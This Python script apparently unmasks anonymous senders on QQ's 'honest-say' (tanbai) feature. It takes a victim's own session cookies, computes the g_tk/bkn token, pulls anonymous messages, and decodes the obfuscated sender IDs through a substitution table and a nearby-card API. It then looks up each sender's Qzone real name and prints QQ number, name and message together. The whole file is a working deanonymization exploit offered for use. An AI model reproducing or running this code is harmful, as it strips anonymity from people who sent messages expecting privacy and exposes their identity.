#! /usr/bin/env python
#coding=utf-8
# @Author : nws0507
import io
import sys
import json
import requests
import re
from prettytable import PrettyTable
sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='gbk') 
session         = requests.session()
session.proxies = {"http":"127.0.0.1:8080"}     #设置burp为代理
def cookies(s):
    s=s.replace('=',':')
    l=s.split('; ')
    d=[]
    for i in range(len(l)):
        l1=l[i].split(':')
        #print (l1)
        if len(l1)==3:
            l1.remove('pgv_info')
        d.append(l1)
    #print(d)
    return dict(d)

def genbkn(skey):
    b = 5381
    for i in range(0, len(skey)):
        b += (b << 5) + ord(skey[i])
    bkn = (b & 2147483647)
    return str(bkn)



def genqq1(qq):
    #a=qq[4:]
    #print(a,type(a))
    a=qq
    d = {"oe": 0, "n": 0, "z": 0, "on": 0,
         "oK": 1, "6": 1, "5": 1, "ov": 1,
         "ow": 2, "-": 2, "A": 2, "oc": 2,
         "oi": 3, "o": 3, "i": 3, "oz": 3,
         "7e": 4, "v": 4, "P": 4, "7n": 4,
         "7K": 5, "4": 5, "k": 5, "7v": 5,
         "7w": 6, "C": 6, "s": 6, "7c": 6,
         "7i": 7, "S": 7, "l": 7, "7z": 7,
         "Ne": 8, "c": 8, "F": 8, "Nn": 8,
         "NK": 9, "E": 9, "q": 9, "Nv": 9}
    l = 4
    ans = ''
    
    e=[]
    for j in [0,4,8,12,16,20]:
        e.append(qq[j:j+4])
    #print(e)
    for k in range(len(e)):
        s=e[k]
        #print(s)
        i = 0
        if s==None:
            break
        while (i <len(s) ):
            
            if i+1 < l:
                x = s[i]+s[i+1]
                if x in d.keys():
                    ans = ans+str(d[x])
                    i = i+2
                    #print(ans)
                    
            if a[i] in d.keys() and i<len(s):
                ans = ans+str(d[s[i]])
                i = i+1
                #print(ans)
        k=k+1
    #print(ans)
    return ans

    
    
def getuid(s):
    global cookie
    
    headers = {'User-Agent':'ozilla/5.0 (CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E5216a QQ/7.5.5.426 V1_IPH_SQ_7.5.5_1_APP_A Pixel/1080 Core/UIWebView Device/Apple(iPhone 8Plus) NetType/WIFI QBWebViewType/1'}
    cookie=cookies(s)
    #print(cookie)    
    skey=cookie['skey']
    geturl='https://ti.qq.com/cgi-node/honest-say/receive/mine?_client_version=2.3.5&_t=1531303725632&token='+genbkn(skey)
    tanbai=requests.get(geturl,headers = headers,cookies=cookie,timeout=1000)
    print(tanbai.json())
    
    tanbai_EncodeUin = re.findall(r'"fromEncodeUin":"(.+?)"',tanbai.text)
    tanbai_topicName = re.findall(r'"topicName":"(.+?)"',tanbai.text)
    	
    row = PrettyTable()
    row.field_names = ["QQ","备注","坦白说"]
    i = 0
    qzone_url = 'https://h5.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/user/cgi_personal_card?uin='
    while i<len(tanbai_EncodeUin):
        if len(tanbai_EncodeUin[i])==28:
            num = genqq1(tanbai_EncodeUin[i].replace('*S1*',''))
        else:
            num = genqq1(tanbai_EncodeUin[i].replace('*S1*',''))
        print(num)
        if len(num)==18:
            json=post(num,s)
            #print(json)
            miwen=json['result']['ss_uin']
            print(miwen)
            friendrealqq =genqq1(miwen.replace('*S1*',''))
            print(friendrealqq)
            print('-'*50)
        else:
            friendrealqq=num
            print(friendrealqq)
            print('-'*50)
            
        tanbai = tanbai_topicName[i]
        try:
            user_qzone = qzone_url + friendrealqq + '&g_tk=' + genbkn(skey)
            resp = requests.get(user_qzone,headers = headers,cookies=cookie)
            #print(resp.text)
            nick =  re.findall(r'"realname":"(.+?)"',resp.text)[0]
            row.add_row([friendrealqq,nick,tanbai])
            i = i + 1
        except Exception as e:
            nick=' '
            row.add_row([friendrealqq,nick,tanbai])
            i=i+1
            continue
        
    print(row)
    

def post(uid,s):
    
    PostUrl = "https://nearby.qq.com/cgi-bin/nearby/web/card/get_score_page_info"
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0'}
    cookie=cookies(s) 
    #print(cookie)
    postData = {'enumn_type':'1',
                'latitude':'0',
                'longitude':'0',
                'portal':'2',
                'client_type':'2',
                'list_size':'10',
                'gender':'0',
                'client_version':'0',
                'tinyid':uid,
                'bkn':'1090067014'
                            }
    #datas = urllib.parse.urlencode(postData).encode(encoding='UTF-8')
    response = requests.post(PostUrl,headers=headers,data=postData,cookies=cookie,proxies =session.proxies,timeout=10)
    #print(response.json())
    return response.json()
    

        




s=''   #cookie
getuid(s)

